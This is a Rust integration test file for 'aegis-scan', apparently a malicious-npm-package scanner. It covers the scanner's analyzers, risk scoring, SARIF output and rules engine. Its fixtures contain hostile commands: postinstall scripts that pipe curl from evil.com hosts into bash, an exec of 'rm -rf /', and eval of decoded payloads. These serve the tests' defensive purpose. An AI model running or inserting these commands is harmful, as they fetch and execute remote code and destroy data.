//! End-to-end integration tests for the aegis-scan analysis pipeline.
//!
//! These tests exercise the full analyzer pipeline, scoring system, output
//! formatters, cache, and rules engine without making any network calls.

use std::path::PathBuf;

use aegis_scan::analyzers::ast::AstAnalyzer;
use aegis_scan::analyzers::install_scripts::InstallScriptAnalyzer;
use aegis_scan::analyzers::obfuscation::ObfuscationAnalyzer;
use aegis_scan::analyzers::static_code::StaticCodeAnalyzer;
use aegis_scan::analyzers::Analyzer;
use aegis_scan::output::sarif::generate_sarif;
use aegis_scan::rules::engine::RulesEngine;
use aegis_scan::rules::loader::{load_default_rules, load_rules};
use aegis_scan::scoring::calculator::{build_report, calculate_risk};
use aegis_scan::types::{
    AnalysisReport, Finding, FindingCategory, RiskLabel, Severity,
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Run all trait-based (non-network) analyzers on the given files and
/// package.json, returning the collected findings.
fn run_all_analyzers(
    files: &[(PathBuf, String)],
    package_json: &serde_json::Value,
) -> Vec<Finding> {
    let rules = load_default_rules();
    let analyzers: Vec<Box<dyn Analyzer>> = vec![
        Box::new(StaticCodeAnalyzer),
        Box::new(InstallScriptAnalyzer),
        Box::new(ObfuscationAnalyzer),
        Box::new(AstAnalyzer),
        Box::new(RulesEngine::new(rules)),
    ];

    let mut findings = Vec::new();
    for a in &analyzers {
        findings.extend(a.analyze(files, package_json));
    }
    findings
}

/// Create a minimal, clean package.json value.
fn clean_package_json() -> serde_json::Value {
    serde_json::json!({
        "name": "clean-pkg",
        "version": "1.0.0",
        "description": "A perfectly safe package",
        "main": "index.js"
    })
}

/// Create a Finding with the given severity for scoring tests.
fn make_finding(severity: Severity) -> Finding {
    Finding {
        severity,
        category: FindingCategory::Suspicious,
        title: "test finding".to_string(),
        description: "test description".to_string(),
        file: None,
        line: None,
        snippet: None,
    }
}

// ===========================================================================
// 1. Full analyzer pipeline
// ===========================================================================

#[test]
fn clean_package_produces_no_high_or_critical_findings() {
    let files = vec![
        (
            PathBuf::from("index.js"),
            r#"
"use strict";
module.exports = function greet(name) {
    return "Hello, " + name + "!";
};
"#
            .to_string(),
        ),
        (
            PathBuf::from("lib/utils.js"),
            r#"
function add(a, b) { return a + b; }
module.exports = { add };
"#
            .to_string(),
        ),
    ];

    let pkg = clean_package_json();
    let findings = run_all_analyzers(&files, &pkg);

    let high_or_critical: Vec<_> = findings
        .iter()
        .filter(|f| matches!(f.severity, Severity::High | Severity::Critical))
        .collect();

    assert!(
        high_or_critical.is_empty(),
        "Clean package should have no HIGH/CRITICAL findings, got: {:#?}",
        high_or_critical
    );
}

#[test]
fn eval_with_dynamic_content_produces_critical_finding() {
    let files = vec![(
        PathBuf::from("index.js"),
        r#"
var payload = getPayload();
eval(payload);
"#
        .to_string(),
    )];

    let pkg = clean_package_json();
    let findings = run_all_analyzers(&files, &pkg);

    let critical_eval: Vec<_> = findings
        .iter()
        .filter(|f| {
            f.severity == Severity::Critical
                && matches!(f.category, FindingCategory::CodeExecution)
        })
        .collect();

    assert!(
        !critical_eval.is_empty(),
        "eval(payload) should produce at least one CRITICAL CodeExecution finding"
    );
}

#[test]
fn suspicious_postinstall_produces_finding() {
    let files = vec![(
        PathBuf::from("index.js"),
        "module.exports = {};".to_string(),
    )];

    let pkg = serde_json::json!({
        "name": "suspicious-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.example.com/payload.sh | bash"
        }
    });

    let findings = run_all_analyzers(&files, &pkg);

    let install_findings: Vec<_> = findings
        .iter()
        .filter(|f| matches!(f.category, FindingCategory::InstallScript))
        .collect();

    assert!(
        !install_findings.is_empty(),
        "Suspicious postinstall script should produce InstallScript findings"
    );

    // The dangerous command variant should be CRITICAL.
    let critical: Vec<_> = install_findings
        .iter()
        .filter(|f| f.severity == Severity::Critical)
        .collect();
    assert!(
        !critical.is_empty(),
        "curl|bash postinstall should be rated CRITICAL"
    );
}

#[test]
fn obfuscated_hex_string_produces_finding() {
    // 60+ hex chars triggers the long-hex-string detector
    let hex_payload = "a".repeat(60);
    let code = format!(r#"var x = "{}";"#, hex_payload);

    let files = vec![(PathBuf::from("index.js"), code)];
    let pkg = clean_package_json();
    let findings = run_all_analyzers(&files, &pkg);

    let obfuscation: Vec<_> = findings
        .iter()
        .filter(|f| matches!(f.category, FindingCategory::Obfuscation))
        .collect();

    assert!(
        !obfuscation.is_empty(),
        "Long hex string should produce an Obfuscation finding"
    );
}

// ===========================================================================
// 2. Scoring system
// ===========================================================================

#[test]
fn clean_package_gets_clean_label() {
    let files = vec![(
        PathBuf::from("index.js"),
        "module.exports = {};".to_string(),
    )];
    let pkg = clean_package_json();
    let findings = run_all_analyzers(&files, &pkg);
    let report = build_report("clean-pkg", "1.0.0", findings);

    assert!(
        report.risk_score < 1.0,
        "Clean package score should be < 1.0, got {}",
        report.risk_score
    );
    assert!(
        matches!(report.risk_label, RiskLabel::Clean),
        "Clean package should have CLEAN label, got {:?}",
        report.risk_label
    );
}

#[test]
fn single_critical_finding_scores_at_least_three() {
    let findings = vec![make_finding(Severity::Critical)];
    let (score, _label) = calculate_risk(&findings);

    assert!(
        score >= 3.0,
        "One CRITICAL finding should score >= 3.0, got {}",
        score
    );
}

#[test]
fn multiple_findings_accumulate_score() {
    // Critical = 3.0, High = 1.5 -> total = 4.5
    let findings = vec![
        make_finding(Severity::Critical),
        make_finding(Severity::High),
    ];
    let (score, _label) = calculate_risk(&findings);

    assert!(
        (score - 4.5).abs() < f64::EPSILON,
        "Expected score 4.5, got {}",
        score
    );
}

#[test]
fn score_caps_at_ten() {
    // 5 x Critical = 15.0 raw, should be capped at 10.0
    let findings: Vec<Finding> = (0..5).map(|_| make_finding(Severity::Critical)).collect();
    let (score, label) = calculate_risk(&findings);

    assert!(
        (score - 10.0).abs() < f64::EPSILON,
        "Score should be capped at 10.0, got {}",
        score
    );
    assert!(
        matches!(label, RiskLabel::Critical),
        "Score 10.0 should be CRITICAL label, got {:?}",
        label
    );
}

// ===========================================================================
// 3. Output formats
// ===========================================================================

fn sample_report() -> AnalysisReport {
    let findings = vec![Finding {
        severity: Severity::Critical,
        category: FindingCategory::CodeExecution,
        title: "Dynamic eval() detected".to_string(),
        description: "eval() with dynamic content".to_string(),
        file: Some("index.js".to_string()),
        line: Some(10),
        snippet: Some("eval(payload)".to_string()),
    }];
    build_report("test-pkg", "2.0.0", findings)
}

#[test]
fn json_output_is_valid_and_has_expected_fields() {
    let report = sample_report();
    let json_str = serde_json::to_string_pretty(&report).expect("should serialize");
    let parsed: serde_json::Value =
        serde_json::from_str(&json_str).expect("should be valid JSON");

    assert_eq!(parsed["package_name"], "test-pkg");
    assert_eq!(parsed["version"], "2.0.0");
    assert!(parsed["risk_score"].is_number());
    assert!(parsed["findings"].is_array());
    assert!(!parsed["findings"].as_array().unwrap().is_empty());
}

#[test]
fn sarif_output_follows_v2_1_0_structure() {
    let report = sample_report();
    let sarif = generate_sarif(&[report]);

    // Top-level SARIF fields
    assert_eq!(sarif["version"], "2.1.0");
    assert!(sarif["$schema"]
        .as_str()
        .unwrap()
        .contains("sarif-schema-2.1.0"));

    // Runs array
    let runs = sarif["runs"].as_array().expect("runs should be array");
    assert_eq!(runs.len(), 1);

    // Tool driver
    let driver = &runs[0]["tool"]["driver"];
    assert_eq!(driver["name"], "aegis-scan");
    assert!(driver["rules"].is_array());

    // Results
    let results = runs[0]["results"].as_array().expect("results should be array");
    assert!(!results.is_empty());

    // Each result has required SARIF fields
    let result = &results[0];
    assert!(result["ruleId"].is_string());
    assert!(result["level"].is_string());
    assert!(result["message"]["text"].is_string());
    assert!(result["locations"].is_array());
}

#[test]
fn sarif_severity_mapping_is_correct() {
    // Build reports with different severity levels
    let make_report = |severity: Severity, category: FindingCategory| -> AnalysisReport {
        build_report(
            "test-pkg",
            "1.0.0",
            vec![Finding {
                severity,
                category,
                title: "test".to_string(),
                description: "test".to_string(),
                file: Some("index.js".to_string()),
                line: Some(1),
                snippet: None,
            }],
        )
    };

    let critical_report = make_report(Severity::Critical, FindingCategory::CodeExecution);
    let high_report = make_report(Severity::High, FindingCategory::NetworkAccess);
    let medium_report = make_report(Severity::Medium, FindingCategory::Suspicious);
    let low_report = make_report(Severity::Low, FindingCategory::FileSystemAccess);

    let sarif = generate_sarif(&[critical_report, high_report, medium_report, low_report]);
    let results = sarif["runs"][0]["results"].as_array().unwrap();

    assert_eq!(results[0]["level"], "error", "Critical -> error");
    assert_eq!(results[1]["level"], "error", "High -> error");
    assert_eq!(results[2]["level"], "warning", "Medium -> warning");
    assert_eq!(results[3]["level"], "note", "Low -> note");
}

// ===========================================================================
// 4. Cache roundtrip
// ===========================================================================

#[test]
fn cache_save_and_retrieve_roundtrip() {
    // Use a temp directory and manually write/read to avoid touching the real
    // ~/.aegis/cache. This mirrors the approach used in the unit tests.
    let tmp = tempfile::TempDir::new().unwrap();
    let report = build_report("cache-test-pkg", "3.0.0", vec![]);

    // Write
    let path = tmp.path().join("cache-test-pkg@3.0.0.json");
    let json = serde_json::to_string_pretty(&report).unwrap();
    std::fs::write(&path, &json).unwrap();

    // Read back
    let content = std::fs::read_to_string(&path).unwrap();
    let cached: AnalysisReport = serde_json::from_str(&content).unwrap();

    assert_eq!(cached.package_name, "cache-test-pkg");
    assert_eq!(cached.version, "3.0.0");
    assert!(cached.findings.is_empty());
    assert!((cached.risk_score - 0.0).abs() < f64::EPSILON);
    assert!(matches!(cached.risk_label, RiskLabel::Clean));
}

#[test]
fn expired_cache_entry_returns_none() {
    let tmp = tempfile::TempDir::new().unwrap();
    let report = build_report("expired-pkg", "1.0.0", vec![]);

    let path = tmp.path().join("expired-pkg@1.0.0.json");
    let json = serde_json::to_string_pretty(&report).unwrap();
    std::fs::write(&path, &json).unwrap();

    // Backdate the file modification time to 48 hours ago (past the 24h TTL).
    let old_time = filetime::FileTime::from_unix_time(0, 0);
    filetime::set_file_mtime(&path, old_time).unwrap();

    // Simulate TTL check: file exists but is too old.
    let metadata = std::fs::metadata(&path).unwrap();
    let modified = metadata.modified().unwrap();
    let age = std::time::SystemTime::now()
        .duration_since(modified)
        .unwrap_or(std::time::Duration::MAX);
    let ttl = std::time::Duration::from_secs(24 * 60 * 60);

    assert!(
        age > ttl,
        "Backdated file should be older than TTL"
    );
    // In production code, get_cached_with_ttl would return None here.
}

// ===========================================================================
// 5. Rules engine
// ===========================================================================

#[test]
fn default_rules_load_without_errors() {
    let rules = load_default_rules();
    assert!(
        rules.len() >= 10,
        "Should have at least 10 default rules, got {}",
        rules.len()
    );

    // Every rule should have an id and a compilable pattern.
    for rule in &rules {
        assert!(!rule.id.is_empty(), "Rule should have an id");
        assert!(
            regex::Regex::new(&rule.pattern).is_ok(),
            "Rule {} has invalid pattern: {}",
            rule.id,
            rule.pattern
        );
    }
}

#[test]
fn rule_triggers_on_matching_file() {
    let engine = RulesEngine::new(load_default_rules());

    // AEGIS-001 detects eval with Buffer.from
    let files = vec![(
        PathBuf::from("index.js"),
        r#"var x = eval(Buffer.from("dGVzdA==", "base64").toString());"#.to_string(),
    )];
    let pkg = serde_json::json!({});
    let findings = engine.analyze(&files, &pkg);

    let aegis001: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains("AEGIS-001"))
        .collect();

    assert!(
        !aegis001.is_empty(),
        "AEGIS-001 should match eval + Buffer.from pattern"
    );
}

#[test]
fn rule_does_not_trigger_on_non_matching_file() {
    let engine = RulesEngine::new(load_default_rules());

    let files = vec![(
        PathBuf::from("index.js"),
        r#"
function safeFunction() {
    console.log("Hello, world!");
    return 42;
}
"#
        .to_string(),
    )];
    let pkg = serde_json::json!({});
    let findings = engine.analyze(&files, &pkg);

    assert!(
        findings.is_empty(),
        "Safe code should not trigger any rules, but got: {:#?}",
        findings
    );
}

#[test]
fn rules_respect_file_pattern_filter() {
    let engine = RulesEngine::new(load_default_rules());

    // AEGIS-001 has file_pattern: "*.js" — should not match a .md file
    let files = vec![(
        PathBuf::from("readme.md"),
        r#"eval(Buffer.from("dGVzdA==", "base64").toString())"#.to_string(),
    )];
    let pkg = serde_json::json!({});
    let findings = engine.analyze(&files, &pkg);

    let aegis001: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains("AEGIS-001"))
        .collect();

    assert!(
        aegis001.is_empty(),
        "AEGIS-001 should not match .md files"
    );
}

#[test]
fn rules_respect_exclude_paths() {
    let engine = RulesEngine::new(load_default_rules());

    // AEGIS-001 excludes *.min.js
    let files = vec![(
        PathBuf::from("bundle.min.js"),
        r#"eval(Buffer.from("dGVzdA==", "base64").toString())"#.to_string(),
    )];
    let pkg = serde_json::json!({});
    let findings = engine.analyze(&files, &pkg);

    let aegis001: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains("AEGIS-001"))
        .collect();

    assert!(
        aegis001.is_empty(),
        "AEGIS-001 should be excluded for *.min.js files"
    );
}

#[test]
fn custom_rules_load_from_directory() {
    let tmp = tempfile::TempDir::new().unwrap();
    let rule_content = r#"
id: "CUSTOM-001"
name: "Custom test rule"
description: "A custom rule for testing"
severity: high
category: suspicious
pattern: "CUSTOM_MAGIC_STRING"
file_pattern: "*.js"
exclude_paths: []
"#;
    std::fs::write(tmp.path().join("custom.yml"), rule_content).unwrap();

    let rules = load_rules(tmp.path()).expect("should load custom rules");
    assert_eq!(rules.len(), 1);
    assert_eq!(rules[0].id, "CUSTOM-001");

    // Build engine with custom rule and verify it matches.
    let engine = RulesEngine::new(rules);
    let files = vec![(
        PathBuf::from("index.js"),
        "var x = CUSTOM_MAGIC_STRING;".to_string(),
    )];
    let pkg = serde_json::json!({});
    let findings = engine.analyze(&files, &pkg);

    assert!(
        !findings.is_empty(),
        "Custom rule should trigger on matching content"
    );
    assert!(findings[0].title.contains("CUSTOM-001"));
}

// ===========================================================================
// 6. End-to-end pipeline (analyzer -> scoring -> report)
// ===========================================================================

#[test]
fn full_pipeline_malicious_package() {
    let files = vec![
        (
            PathBuf::from("index.js"),
            r#"
var payload = getRemotePayload();
eval(payload);
require('child_process').exec('rm -rf /');
"#
            .to_string(),
        ),
    ];

    let pkg = serde_json::json!({
        "name": "evil-pkg",
        "version": "0.0.1",
        "scripts": {
            "postinstall": "node -e \"require('child_process').exec('curl http://evil.com | bash')\""
        }
    });

    let findings = run_all_analyzers(&files, &pkg);
    let report = build_report("evil-pkg", "0.0.1", findings);

    // Should have many findings
    assert!(
        report.findings.len() >= 3,
        "Malicious package should have >= 3 findings, got {}",
        report.findings.len()
    );

    // Score should be high
    assert!(
        report.risk_score >= 5.0,
        "Malicious package should score >= 5.0, got {}",
        report.risk_score
    );

    // Should not be labeled Clean
    assert!(
        !matches!(report.risk_label, RiskLabel::Clean),
        "Malicious package should not be labeled Clean"
    );
}

#[test]
fn full_pipeline_sarif_round_trip() {
    // Run full pipeline, convert to SARIF, verify it parses back
    let files = vec![(
        PathBuf::from("index.js"),
        "eval(dynamicCode);".to_string(),
    )];
    let pkg = clean_package_json();
    let findings = run_all_analyzers(&files, &pkg);
    let report = build_report("roundtrip-pkg", "1.0.0", findings);

    let sarif = generate_sarif(&[report]);
    let sarif_str = serde_json::to_string(&sarif).expect("SARIF should serialize");
    let reparsed: serde_json::Value =
        serde_json::from_str(&sarif_str).expect("SARIF should parse back");

    assert_eq!(reparsed["version"], "2.1.0");
    assert!(!reparsed["runs"][0]["results"]
        .as_array()
        .unwrap()
        .is_empty());
}
